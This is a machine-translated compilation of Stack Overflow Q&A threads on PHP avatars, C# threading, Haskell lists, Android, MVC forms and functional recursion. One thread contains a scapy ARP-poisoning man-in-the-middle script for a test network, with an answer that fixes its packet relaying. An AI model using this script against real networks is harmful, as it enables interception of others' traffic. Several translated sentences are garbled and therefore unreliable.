您可以在此处查看有关此内容的更多文档：[https ://en.gravatar.com/site/implement/images/](https://en.gravatar.com/site/implement/images/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T08:51:57.870

我定制了 wavatar wordpress 插件。我自定义的 wavaters.php 文件的内容：

```
//wavaters.php
define("AVATAR_SIZE",           '100');
define("WAVATAR_BACKGROUNDS",   '4');
define("WAVATAR_FACES",         '11');
define("WAVATAR_BROWS",         '8');
define("WAVATAR_EYES",          '13');
define("WAVATAR_PUPILS",        '11');
define("WAVATAR_MOUTHS",        '19');

/*-----------------------------------------------------------------------------
Clamp a value between 0 and 255
-----------------------------------------------------------------------------*/

function wavatar_clamp ($v)
{
    return $v < 0 ? 0 : ($v > 255 ? 255 : $v);
}

/*-----------------------------------------------------------------------------
Handy function for converting hus/sat/lum color values to RGB, which makes it
very easy to generate random-yet-still-vibrant colors.
-----------------------------------------------------------------------------*/

function wavatar_hsl ($h, $s, $l) 
{

    if ($h>240 || $h<0 || $s>240 || $s<0 || $l>240 || $l<0)
        return array(0,0,0);
    if ($h<=40) {
        $R=255;
        $G=(int)($h/40*256);
        $B=0;
    } elseif ($h>40 && $h<=80) {
        $R=(1-($h-40)/40)*256;
        $G=255;
        $B=0;
    } elseif ($h>80 && $h<=120) {
        $R=0;
        $G=255;
        $B=($h-80)/40*256;
    } elseif ($h>120 && $h<=160) {
        $R=0;
        $G=(1-($h-120)/40)*256;
        $B=255;
    } elseif ($h>160 && $h<=200) {
        $R=($h-160)/40*256;
        $G=0;
        $B=255;
    } elseif ($h>200) {
        $R=255;
        $G=0;
        $B=(1-($h-200)/40)*256;
    }
    $R=$R+(240-$s)/240*(128-$R);
    $G=$G+(240-$s)/240*(128-$G);
    $B=$B+(240-$s)/240*(128-$B);
    if ($l<120) {
        $R=($R/120)*$l;
        $G=($G/120)*$l;
        $B=($B/120)*$l;
    } else {
        $R=$l*((256-$R)/120)+2*$R-256;
        $G=$l*((256-$G)/120)+2*$G-256;
        $B=$l*((256-$B)/120)+2*$B-256;
    }
    return array((int)wavatar_clamp ($R),(int)wavatar_clamp($G),(int)wavatar_clamp($B));

}

/*-----------------------------------------------------------------------------
Helper function for building a wavatar.  This loads an image and adds it to 
our composite using the given color values.
-----------------------------------------------------------------------------*/

function wavatar_apply_image ($base, $part)
{

    $file = dirname(__FILE__).'/parts/' . $part . '.png';
    $im = @imagecreatefrompng($file);
    if(!$im)
        return;
    imagecopy($base,$im, 0, 0, 0, 0, AVATAR_SIZE, AVATAR_SIZE);
    imagedestroy($im);

}

/*-----------------------------------------------------------------------------
Builds the avatar.
-----------------------------------------------------------------------------*/

function wavatar_build ($seed, $filename, $size)
{

    //look at the seed (an md5 hash) and use pairs of digits to determine our
    //"random" parts and colors.
    $face =         1 + (hexdec (substr ($seed,  1, 2)) % (WAVATAR_FACES));
    $bg_color =         (hexdec (substr ($seed,  3, 2)) % 240);
    $fade =         1 + (hexdec (substr ($seed,  5, 2)) % (WAVATAR_BACKGROUNDS));
    $wav_color =        (hexdec (substr ($seed,  7, 2)) % 240);
    $brow =         1 + (hexdec (substr ($seed,  9, 2)) % (WAVATAR_BROWS));
    $eyes =         1 + (hexdec (substr ($seed, 11, 2)) % (WAVATAR_EYES));
    $pupil =        1 + (hexdec (substr ($seed, 13, 2)) % (WAVATAR_PUPILS));
    $mouth =        1 + (hexdec (substr ($seed, 15, 2)) % (WAVATAR_MOUTHS));
    // create backgound
    $avatar = imagecreatetruecolor (AVATAR_SIZE, AVATAR_SIZE);
    //Pick a random color for the background
    $c = wavatar_hsl ($bg_color, 240, 50);
    $bg = imagecolorallocate ($avatar, $c[0], $c[1], $c[2]);
    imagefill($avatar, 1, 1, $bg);
    $c = wavatar_hsl ($wav_color, 240, 170);
    $bg = imagecolorallocate ($avatar, $c[0], $c[1], $c[2]);
    //Now add the various layers onto the image
    wavatar_apply_image ($avatar, "fade$fade");
    wavatar_apply_image ($avatar, "mask$face");
    imagefill($avatar, (int)(AVATAR_SIZE / 2),(int)(AVATAR_SIZE / 2),$bg);
    wavatar_apply_image ($avatar, "shine$face");
    wavatar_apply_image ($avatar, "eyes$eyes");
    wavatar_apply_image ($avatar, "brow$brow");
    wavatar_apply_image ($avatar, "pupils$pupil");
    wavatar_apply_image ($avatar, "mouth$mouth");
    //resize if needed
    if ($size != AVATAR_SIZE) {
        $out = imagecreatetruecolor($size,$size);
        imagecopyresampled ($out,$avatar, 0, 0, 0, 0, $size, $size, AVATAR_SIZE, AVATAR_SIZE);
        imagepng($out, $filename);
        imagedestroy($out);
        imagedestroy($avatar);
    } else {
        imagepng($avatar, $filename);
        imagedestroy($avatar);
    }

} 
```

要使用，请下载原版[wavatar](http://downloads.wordpress.org/plugin/wavatars.zip)。解压parts文件夹，放到wavatar.php文件所在的目录下。然后像这样调用：

```
//$seed: $seed to use in create unique avatar for every user preferably md5 of the users email
//$filename: where and what name the image should be stored with
//$size: size of the image
function wavatar_build ($seed, $filename, $size); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T07:51:59.433

[WP_MonsterID 详细说明了它是如何工作的。](http://www.splitbrain.org/blog/2007-01/20_monsterid_as_gravatar_fallback)以身作则。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-30T07:46:21.897

您可以使用 imagecreatefrom*() 函数和其他相关函数为自己编写它。例如。[`imagecreatefrompng();`](http://php.net/manual/en/function.imagecreatefrompng.php)

# c# - C# 中的线程问题（字段初始化程序无法引用非静态字段等）

> ID：12659551
> 
> 赞同：0
> 
> 时间：2012-09-30T07:36:52.027
> 
> 标签：c#, multithreading, syntax-error

我在 C# 中的线程有一个非常烦人的问题。使用此代码时，我收到错误“字段初始化程序无法引用非静态字段、方法或属性'Scraper.Form1.scrapeStart()'”：

```
public partial class Form1 : Form
{
    public Thread scrape = new Thread(() => scrapeStart()); //This is where the error happens
    public About about = new About();
    public Form1()
    {
        InitializeComponent();
    }

    public void appendOutput(String s)
    {
        output.AppendText(s);
        output.SelectionStart = output.Text.Length;
        output.ScrollToCaret();
        output.Refresh();
    }

    public void scrapeStart(){
        Button button1 = new Button();
        appendOutput("");
        button1.Enabled = true;
    }

    private void button3_Click(object sender, EventArgs e)
    {
        about.ShowDialog();
    }

    private void button1_Click(object sender, EventArgs e)
    {
        button1.Enabled = false;
        scrape.Start();
    }

    private void button2_Click(object sender, EventArgs e)
    {
        scrape.Abort();
        button1.Enabled = true;
    }
} 
```

我意识到如果我将函数 scrapeStart 设为静态它会起作用，但这会使 appendOutput(""); 和 button1.Enabled = true 抛出错误。如果我将新线程放在它开始的位置（button1_Click），那么它不能在 button2_Click 中中止。

我对 C# 有点了解，所以我可能做的所有事情都非常错误，或者这可能只是一个小问题。但无论哪种方式，有人可以帮助我吗？

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-30T07:43:55.473

这实际上与线程无关。如果你写，你会看到完全相同的问题：

```
public class Foo
{
    int x = 10;
    int y = x;   
} 
```

或者更清楚：

```
public class Bar
{
    object obj = this;
} 
```

这里有一点让人分心的是，`this`引用是隐式的——你正在创建一个目标为`this`.

解决方案就是将赋值放入构造函数中：

```
public Thread scrape;
public About about = new About();
public Form1()
{
    InitializeComponent();
    scrape = new Thread(scrapeStart);
} 
```

作为旁白：

*   请不要使用公共领域！
*   请遵守 .NET 命名约定
*   您*还*需要修复`scrapeStart`不应直接访问 UI 元素的线程部分

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-30T07:48:58.093

我认为您需要使用 InvokeRequired。

```
public void scrapeStart()
{
    if (InvokeRequired)
    {
    this.Invoke(new Action(scrapeStart));
    return;
    }
    Button button1 = new Button();
    appendOutput("");
    button1.Enabled = true;
} 
```

# python - 中间人用 scapy 攻击

> ID：12659553
> 
> 赞同：11
> 
> 时间：2012-09-30T07:37:57.080
> 
> 标签：python, network-programming, exploit, scapy, man-in-the-middle

`scapy`我正在尝试在测试网络上进行中间人攻击。我的设置是这样的： ![在此处输入图像描述](../Images/4b3bcffc35a2116f45ba2414aef79a51.png)

现在你明白了，下面是代码：

```
from scapy.all import *
import multiprocessing
import time
class MITM:
  packets=[]
  def __init__(self,victim=("192.168.116.143","00:0c:29:d1:aa:71" ),node2=("192.168.116.1", "00:50:56:c0:00:08")):
    self.victim=victim
    self.node2=node2
    multiprocessing.Process(target=self.arp_poison).start()
    try:
      sniff(filter='((dst %s) and (src %s)) or ( (dst %s) and (src %s))'%(self.node2[0], self.victim[0],self.victim[0],self.node2[0]),prn=lambda x:self.routep(x))
    except KeyboardInterrupt as e:
      wireshark(packets)
    #self.arp_poison()
  def routep(self,packet):
    if packet.haslayer(IP):
      packet.show()
      if packet[IP].dst==self.victim[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.victim[1]
      elif packet[IP].dst==self.node2[0]:
        packet[Ether].src=packet[Ether].dst
        packet[Ether].dst=self.node2[1]
      self.packets.append(packet)
      packet.display()
      send(packet)
      print len(self.packets)
      if len(self.packets)==10:
        wireshark(self.packets)
  def arp_poison(self):
    a=ARP()
    a.psrc=self.victim[0]
    a.pdst=self.node2[0]
    b=ARP()
    b.psrc=self.node2[0]
    b.pdst=self.victim[0]
    cond=True
    while cond:
      send(b)
      send(a)
      time.sleep(5)
      #cond=False
if __name__=="__main__":
  mitm=MITM() 
```

此代码在`VM2`.

Arp 中毒工作正常，我检查了两台机器的 arp 缓存，并且行为符合我的预期。但在里面`routep`，我修改了 src 和 dst mac 地址并尝试将接收到的数据包发送到适当的主机，scapy 给出警告：

```
WARNING: more Mac address to reach destination not found. Using broadcast 
```

我在`wireshark`on中看到`VM2`，修改后的数据包没有离开机器。为什么会这样？我错过了什么吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-06-04T17:46:54.317

如果您使用 scapy's `send()`，它适用于第三层。从 scapy 的文档中：

> send() 函数将在第 3 层发送数据包。也就是说，它将为您处理路由和第 2 层。sendp() 函数将在第 2 层工作。

如果您使用`sendp()`，它不会使用目的地 Mac 地址的默认值，并且您的警告将消失。

# cocoa - Cocoa：来自原始数据的 AVAsset（即 NSData）

> ID：12659555
> 
> 赞同：8
> 
> 时间：2012-09-30T07:38:04.580
> 
> 标签：cocoa, avfoundation, qtkit

我想使用**AVFoundation**在 osx 上显示视频。我想在运行时从原始数据初始化电影。根据此文档：[https](https://developer.apple.com/library/mac/#technotes/tn2300/_index.html) `AVAsset` ://developer.apple.com/library/mac/#technotes/tn2300/_index.html相当于**QTKit 的** `QTMovie`. `QTMovie`具有`movieWithData:error:`从数据加载视频的功能，而我在`AVAsset`. 那么，是否有可能在**AVFoundation**中做同样的事情呢？

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2014-12-26T13:18:26.540

```
NSString *tempFilePath = [NSTemporaryDirectory() stringByAppendingPathComponent:@"tmp.mp3"];

NSFileManager *manager = [NSFileManager defaultManager];
[manager createFileAtPath:tempFilePath contents:mp3Data attributes:nil];

AVURLAsset *asset = [[AVURLAsset alloc] initWithURL:[NSURL fileURLWithPath:tempFilePath] options:nil];

dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            [manager removeItemAtPath:tempFilePath error:nil];
        }); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-06-07T11:12:54.850

恐怕`AVAsset`从原始数据初始化实例的唯一可能性是将之前的数据保存为文件。`AVAsset`及其子类仅在其构造函数中使用 URL。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2019-05-18T16:28:33.323

可以通过实现创建一个`AVAsset`from an 。`NSData``AVAssetResourceLoaderDelegate`

具体实现：

```
func resourceLoader(_ resourceLoader: AVAssetResourceLoader, shouldWaitForLoadingOfRequestedResource loadingRequest: AVAssetResourceLoadingRequest) -> Bool 
```

它必须：

1.  正确填写 loadingRequest.contentInformationRequest。提示，使用`loadingRequest.contentInformationRequest.contentType = AVFileType.mycontenttype.rawValue`
2.  正确响应数据

# android - onTouchListener 上的 Android 错误

> ID：12659560
> 
> 赞同：0
> 
> 时间：2012-09-30T07:39:37.900
> 
> 标签：android, touch, zooming

我正在开发一款适用于 Android 的应用程序，该应用程序应该从另一个活动中获取图像并显示它，然后应该能够使用捏合缩放来放大和缩小该图像。我尝试使用以下代码实现此目的，但是在 onTouchListener 上出现错误。它说“onTouchListener 无法解析为一种类型”，但我不明白为什么。我无法导入它或任何东西，我认为语法还可以。无论如何，你们中的任何人都知道问题是什么吗？

```
public class ImageEditing extends Activity implements onTouchListener {

ImageView selectedImage;
Intent intent;
private float oldDistance = 0f;

@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    this.requestWindowFeature(Window.FEATURE_NO_TITLE);
    setContentView(R.layout.imageediting);

    // Load the selected image      
    selectedImage = (ImageView) findViewById(R.id.selectedImage);
    String imagePath = getIntent().getStringExtra("com.andriesse.henk.path");
    Bitmap bitmap = BitmapFactory.decodeFile(imagePath);
    selectedImage.setImageBitmap(bitmap);

    selectedImage.setOnTouchListener(this);

}

public boolean onTouch(View v, MotionEvent event) {
    if((event.getAction() & MotionEvent.ACTION_MASK) == MotionEvent.ACTION_MOVE) {
        if(event.getPointerCount() == 2) {
            float x = event.getX(0) - event.getX(1);
            float y = event.getY(0) - event.getY(1);
            float newDistance = FloatMath.sqrt(x*x+y*y);
            if(newDistance > oldDistance) {
                oldDistance = newDistance;
            } else {
                oldDistance = newDistance;
            }
        }
    }
    return true;
}

} 
```

**编辑：**

解决了 onTouchListener 的问题，但是捏缩放不起作用。有人知道为什么吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:44:52.990

```
public class ImageEditing extends Activity implements onTouchListener { 
```

OnTouchListener 是一个类接口，因此以大写字母开头。

```
public class ImageEditing extends Activity implements OnTouchListener { 
```

# haskell - 在列表中的每 n 个元素之后插入特定元素 y

> ID：12659562
> 
> 赞同：6
> 
> 时间：2012-09-30T07:39:55.443
> 
> 标签：haskell, functional-programming

我正在自学 Haskell，并且在我的书中遇到了一个问题，该问题要求我定义一个函数 insert，该函数接受一个正整数`n`、元素`y`和一个在列表中的每个元素之后`xs`插入指定元素的列表。`y``n`

我相信模式匹配可能是一个很好的方法，但我还没有真正理解它的含义

```
insert :: Int -> Char -> [a] -> [a]
insert 0 y xs = xs
insert n y [] = []
insert n y (x:xs) 
```

该功能应如何工作的示例：

```
insert 2 'X' "abcdefghijk" = "abXcdXefXghXijXk" 
```

在这一点上，我已经处理了基本情况，但我不知道如何从这里开始。

有任何想法吗？谢谢

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-30T07:59:57.210

在最后一种情况下，取列表的 n 个元素，插入一个 y 的单例列表，然后在删除列表的前 n 个元素后附加递归调用函数的结果。

```
insert :: Int -> Char -> [a] -> [a]
insert 0 y xs = xs
insert n y [] = []
insert n y xs
 | length xs < n = xs
 | otherwise = take n xs ++ [y] ++ insert n y (drop n xs) 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-09-30T08:04:22.587

可以使用库函数来发挥自己的优势。

```
import Data.List

insertAtN n y xs = intercalate [y] . groups n $ xs
  where
    groups n xs = takeWhile (not.null) . unfoldr (Just . splitAt n) $ xs 
```

当然，如果你插入`Char`到类型列表中，`[a]`那么`a`is `Char`，因为在 Haskell 中，列表的所有元素都是相同的类型。

* * *

为了帮助您更直接地理解这一点，让我们首先看一下如何制作一个列表的副本：

```
copyList (x:xs) = x : copyList xs
copyList [] = [] 
```

现在想象你为每个被复制的元素添加索引值（重新实现`zip xs [1..]`）：

```
copyIdxList xs = go 1 xs where
  go i (x:xs) = (x,i) : go (i+1) xs
  go _ [] = [] 
```

现在我们在处理每个元素时都有一个索引值，我们可以使用它，例如，将列表的每个第 10 个元素放入结果中*两次*：

```
copyIdxTenthTwice xs = go 1 xs where
  go i (x:xs) | i==10 = (x,i) : (x,i) : go 1 xs
  go i (x:xs)         = (x,i) : go (i+1) xs
  go _ [] = [] 
```

看看我要去哪里？`x`您可以在此处插入，而不是复制`y`。而且您不必将索引放入结果中。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-09-30T08:01:37.160

您可以编写一个辅助函数，当它变为零时倒计时并重置。

```
insert :: Int -> a -> [a] -> [a]
insert n y xs = countdown n xs where
   countdown 0 xs = y:countdown n xs -- reset to original n
   countdown _ [] = []
   countdown m (x:xs) = x:countdown (m-1) xs 
```

如果要在最后插入，你想要什么行为？在这里，我通过 put `countdown 0 xs`before优先插入而不是完成`countdown _ []`。如果你想在最后跳过插入，你怎么能重写它？

示例用法：

```
*Main> insert 3 '|' "Hello Mum, erm... can I borrow £20000 please?"
"Hel|lo |Mum|, e|rm.|.. |can| I |bor|row| £2|000|0 p|lea|se?|" 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-09-30T21:41:24.700

```
ins n y xs = zip xs (cycle [1..n]) >>= f where
  f (x,k) = if k == n then [x,y] else [x] 
```

该`zip`部分将循环“索引”附加到列表的元素，例如 for`n = 3`和`xs = "abcdefg"`我们得到`[('a',1),('b',2)('c',3)('d',1)('e',2)('f',3)('g',1)]`。现在`(>>=)`（与列表的情况相同`concatMap`）用于`f`将每一对映射回原始元素，除非我们有循环的最后一个索引：在这种情况下，我们也插入一个额外的分隔元素`y`。

# php - 最好的方法也是管理不断增长的图像文件夹的大小

> ID：12659564
> 
> 赞同：0
> 
> 时间：2012-09-30T07:40:03.410
> 
> 标签：php, image, directory

**我有一个带有画布的联系表，人们可以在其中画一些东西。提交后，将在文件夹中创建文件，并使用 phpmailer 将带有嵌入图像的邮件发送给我。**

*我打算在数据库中保留带有时间戳的文件名并删除那些太旧的文件，但我可以看到文件夹的大小可能会变得非常大。我在共享主机上，并且已经接近我的数据限制。因为电子邮件需要对图像的引用，所以需要创建图像，否则邮件大小会变大。一旦我阅读了电子邮件，我就不再需要图像了。我还不知道是否要为用户保存它。*

我有什么可能的选择。第三方也很好，如果这是一件相对容易的事情？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T07:43:37.297

例如，也许您可​​以使用[imgur](http://api.imgur.com/) api。在那里，您也可以将删除哈希保存在数据库中，如果不需要，您可以从 imgur 中删除图片。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-30T08:03:54.043

为什么不将图像作为二进制数据存储在数据库中？不会浪费您的任何磁盘硬盘空间，并且如果图像确实包含病毒，则会使图像更加安全和安全。

# android - 取回堆栈活动

> ID：12659566
> 
> 赞同：0
> 
> 时间：2012-09-30T07:40:16.327
> 
> 标签：android, android-activity, android-lifecycle

我有 2 个活动`ActivityA`& `ActivityB`，如果您打开`ActivityA`并从中选择任何内容，它将打开`ActivityB`，当您完成后`ActivityB`它会返回`ActivityA`，我如何打开`ActivityB`让我们从通知中说，以及当用户完成它时，如果没有我打开后堆栈`ActivityA`，正在询问最好的解决方案，我已经对此有了想法，但仍然不确定这是否是最好的解决方案。

在`ActivityB`

```
Intent intent=new Intent(getApplicationContext(), ActivityA.class);
intent.addFlags(Intent.FLAG_ACTIVITY_REORDER_TO_FRONT);
startActivity(intent);

finish(); 
```

或者我可以在我开始时`ActivityA`发送一个标志from ，如果这个标志存在，我就完成，如果没有，我开始。`ActivityB``B``A``ActivityA`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-30T12:11:17.290

使用 startActivities() 并传递这两个活动。Android 将为您处理后台堆栈

# asp.net-mvc-3 - MVC 3 Razor 视图 BeginForm 表单帖子不起作用

> ID：12659569
> 
> 赞同：1
> 
> 时间：2012-09-30T07:41:00.150
> 
> 标签：asp.net-mvc-3, razor, html-helper

单击按钮表单后不起作用。伙计们有什么想法吗？

**剃刀视图**

```
<div id="contactform">
    <h3>
        Contact Form</h3>
    @using (Html.BeginForm("contacts", "Home"))
    {
        @Html.AntiForgeryToken()
        @Html.ValidationSummary()

        <fieldset>
            <ol>
                <li>
                    @Html.TextBoxFor(m => m.Name)
                    @Html.ValidationMessageFor(m => m.Name)
                </li>
                <li>
                    @Html.TextBoxFor(m => m.Email)
                    @Html.ValidationMessageFor(m => m.Email)
                </li>
                <li>

                    @Html.TextBoxFor(m => m.Phone)
                    @Html.ValidationMessageFor(m => m.Phone)
                </li>
                <li>

                    @Html.TextAreaFor(m => m.Message)
                    @Html.ValidationMessageFor(m => m.Message)
                </li>
            </ol>
            <input type="button" value="contacts"/>
        </fieldset>

    }
</div> 
```

**模型**

```
public class ContactModel
{
    [Required]
    [DataType(DataType.Text)]
    [Display (Name="Name")]  
    public string Name { get; set; }

    [Required]
    [DataType(DataType.EmailAddress)]
    [Display (Name="Email")]
    public string Email { get; set; }

    [Required]        
    [Display (Name="Phone")]
    public string Phone { get; set; }

    [Required]
    [DataType(DataType.MultilineText)]
    [Display(Name = "Message")]   
    public string Message { get; set; }

} 
```

**家庭控制器**

```
[HttpPost]
[ValidateAntiForgeryToken]
public ActionResult contacts(ContactModel contact)
{
    if (ModelState.IsValid)
    {

    }

    return View();
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-30T07:48:57.597

如果您想将数据**提交**到服务器，您需要一个[提交](http://www.w3.org/TR/html-markup/input.submit.html)按钮以便浏览器（如果您不使用 javascript 发布）将您的数据发送到服务器

所以改变：

```
<input type="button" value="contacts"/> 
```

至：

```
<input type="submit" value="contacts"/> 
```

它应该可以工作。

# java - 如何在 Java 中生成一个随机的 9 位数字？

> ID：12659572
> 
> 赞同：2
> 
> 时间：2012-09-30T07:41:38.013
> 
> 标签：java, random, cryptography

> **可能重复：**
> [在 Java 中生成 UUID](https://stackoverflow.com/questions/325443/generate-uuid-in-java)

我需要生成一个 9 位数的唯一代码，就像产品背面使用的代码一样，以识别它们。

代码应该是不重复的，并且它们应该在数字之间没有相关性。而且代码应该都是整数。

我需要使用 java 生成它们并同时将它们插入数据库。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-09-30T08:09:50.887

生成一个 9 位随机数并在数据库中查找它的唯一性。

```
100000000 + random.nextInt(900000000) 
```

或者

```
String.format("%09d", random.nextInt(1000000000)) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-30T08:53:57.283

使用 Commons Lang 的`randomNumeric`方法：

[http://commons.apache.org/lang/api-2.6/org/apache/commons/lang/RandomStringUtils.html#randomNumeric(int](http://commons.apache.org/lang/api-2.6/org/apache/commons/lang/RandomStringUtils.html#randomNumeric(int) )

不过，您必须检查数据库的唯一性。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-30T07:58:38.003

```
 int noToCreate = 1_000; // the number of numbers you need
        Set<Integer> randomNumbers = new HashSet<>(noToCreate);

        while (randomNumbers.size() < noToCreate) {
            // number is only added if it does not exist
            randomNumbers.add(ThreadLocalRandom.current().nextInt(100_000_000, 1_000_000_000));
        } 
```

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-09-30T08:35:33.597

我知道这样做有点奇怪，但我仍然认为你可以拥有唯一的 9 位数字，彼此之间几乎没有关系......

问你问`there should have no correlation between the numbers`

```
public class NumberGen {

    public static void main(String[] args) {

        long timeSeed = System.nanoTime(); // to get the current date time value

        double randSeed = Math.random() * 1000; // random number generation

        long midSeed = (long) (timeSeed * randSeed); // mixing up the time and
                                                        // rand number.

                                                        // variable timeSeed
                                                        // will be unique

                                                       // variable rand will 
                                                       // ensure no relation 
                                                      // between the numbers

        String s = midSeed + "";
        String subStr = s.substring(0, 9);

        int finalSeed = Integer.parseInt(subStr);    // integer value

        System.out.println(finalSeed);
    }

} 
```

# exception-handling - 捕获 webmethod 参数错误

> ID：12659573
> 
> 赞同：1
> 
> 时间：2012-09-30T07:41:44.990
> 
> 标签：exception-handling, webmethod

我有一个这样的网络方法

```
    [WebMethod]
    public static string UpdateProduct(Products obj)
    {
        DbTools.runcmd(TSQLCreate.Update(obj));
        return "SUCCESS";
    } 

```

并有一个用 JS 创建的 XHR 请求，用于将 obj 传递给湿方法

```
    SendOBJToMethod("some.aspx/UpdateProduct"
    ,obj // My Product Object
    ,function() { alert("Updated"); }); //SUCCESS FUNC 

```

和产品类是这样的

```
    public class Products : Books
    {
        public Products()
        {
            this.AddedDate = DateTime.Now;
            ///throw new NotImplementedException();
        }

        #region COMMON
        [SQLIDColumn]
        public int ProductID { get; set; }
        [SQLColumn]
        public string ProductName { get; set; }
        [SQLColumn]
        public string ProductCode { get; set; }
        [SQLColumn]
        public string Barcode { get; set; }
        ..............
        private bool isOnePrice;
        [SQLColumn]
        public bool IsOnePrice
        {
            get { return isOnePrice; }
            set { isOnePrice = value; }
        }

        private decimal onePrice;
        [SQLColumn]
        public decimal OnePrice
        {
            get
            {
                if (onePrice == 0M) onePrice = labelPrice;
                return onePrice;
            }
            set {onePrice = value;}
        }
    } 

```

问题：
当我将对象（产品）作为属性（十进制）发送时，OnePrice 为空，我收到错误“不是十进制的有效值”。

让我知道这一点，谁抛出的异常？因为我想更改此消息。

谢谢。

# c - 纯 C 语言中是否有易于使用的向量/矩阵/四元数数学库？

> ID：12659579
> 
> 赞同：11
> 
> 时间：2012-09-30T07:42:05.063
> 
> 标签：c, math, opengl

我意识到有几个 c++ 库，但我更喜欢 C。我发现了这个，但它似乎只适用于 Mac：[https ://github.com/rsebbe/CeedMath](https://github.com/rsebbe/CeedMath)

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2012-09-30T07:48:23.540

（无耻的自我宣传）你可能对我的[linmath.h](https://github.com/datenwolf/linmath.h)感兴趣。请注意，我只是偶尔更新它，并且某些部分可能仍然包含奇怪的错误。请报告您可能发现的任何内容。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-10-01T12:54:41.343

刚找到这个，好像是最全的。显然不能说它的质量：[https ://github.com/Kazade/kazmath.git](https://github.com/Kazade/kazmath.git)

还有这个，看起来很旧（我发现了 2002 年的代码），但这并不意味着它很糟糕：Meschach

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-09-30T17:37:47.553

您应该查看[gsl](http://www.gnu.org/software/gsl/)的数学运算，以及[gmp](http://gmplib.org/)的任意精度数字。它们都是跨平台的 gnu c 库，针对速度进行了高度优化，并支持多种类型的操作。

干杯，内德

* * *

## 回答 #4

> 赞同：-3
> 
> 时间：2012-10-01T13:58:28.150

为什么没有人提到[GLM](http://glm.g-truc.net/)库？它只是 OpenGL 的标头数学库。

# scala - 函数式编程 - 非常强调递归，为什么？

> ID：12659581
> 
> 赞同：74
> 
> 时间：2012-09-30T07:42:17.683
> 
> 标签：scala, recursion, functional-programming, tail-recursion

我开始了解函数式编程 [FP]（使用 Scala）。从我最初的学习中得出的一件事是 FP 严重依赖递归。而且看起来，在*纯*FP 中，进行迭代的唯一方法是编写递归函数。

由于递归的大量使用，FPs 不得不担心的下一件事情`StackoverflowExceptions`通常是由于长时间的递归调用。`@tailrec`这是通过引入一些优化来解决的（从 Scala v2.8 开始，在堆栈帧和注释的维护中与尾递归相关的优化）

有人可以告诉我为什么递归对函数式编程范式如此重要吗？如果我们迭代地做一些事情，函数式编程语言的规范中是否有一些东西会被“违反”？如果是，那么我也很想知道这一点。

PS：请注意，我是函数式编程的新手，所以如果他们解释/回答我的问题，请随时向我指出现有资源。此外，我确实理解 Scala 也特别提供了对迭代工作的支持。

* * *

## 回答 #1

> 赞同：54
> 
> 时间：2012-09-30T08:07:39.703

[Church Turing 论文](http://en.wikipedia.org/wiki/Church%E2%80%93Turing_thesis)强调了不同可计算性模型之间的等价性。

使用递归，我们在解决*某些*问题时不需要*可变状态*，这使得用更简单的术语指定语义成为可能。因此，从形式上讲，解决方案可以更简单。

 *我认为 Prolog 比函数式语言更好地展示了递归的有效性（它没有迭代），以及我们在使用它时遇到的实际限制。

* * *

## 回答 #2

> 赞同：41
> 
> 时间：2012-09-30T08:03:49.047

纯函数式编程意味着没有副作用的编程。这意味着，例如，如果您编写一个循环，则循环的主体不会产生副作用。因此，如果你想让你的循环做某事，它必须重用上一次迭代的结果并为下一次迭代产生一些东西。因此，您的循环体是一个函数，将先前执行的结果作为参数，并使用自己的结果调用自身以进行下一次迭代。与直接为循环编写递归函数相比，这并没有太大的优势。

一个不做一些微不足道的事情的程序将不得不在某个时候迭代某些事情。对于函数式编程，这意味着程序必须使用递归函数。

* * *

## 回答 #3

> 赞同：25
> 
> 时间：2012-09-30T08:50:09.013

带来递归执行*需求的特性是不可变变量。*

考虑一个用于计算列表总和的简单函数（在伪代码中）：

```
fun calculateSum(list):
    sum = 0
    for each element in list: # dubious
        sum = sum + element # impossible!
    return sum 
```

现在，`element`列表的每次迭代都不同，但我们可以重写它以使用`foreach`带有 lambda 参数的函数来解决这个问题：

```
fun calculateSum(list):
    sum = 0
    foreach(list, lambda element:
        sum = sum + element # impossible!
    )
    return sum 
```

尽管如此，`sum`变量的值必须在每次运行 lambda 时更改。这在具有不可变变量的语言中是非法的，因此您必须以不改变状态的方式重写它：

```
fun calculateSum([H|T]):
    return H + calculateSum(T)

fun calculateSum([]):
    return 0 
```

现在，这个实现将需要大量地推入和弹出调用堆栈，并且所有小操作都会执行此操作的程序不会运行得很快。因此，我们将其重写为尾递归，这样编译器就可以进行尾调用优化：

```
fun calculateSum([H|T], partialSum):
    return calculateSum(T, H + partialSum)

fun calculateSum([], partialSum):
    return partialSum

fun calculateSum(list):
    return calculateSum(list, 0) 
```

当然，如果你想无限循环，你绝对需要一个尾递归调用，否则它会堆栈溢出。

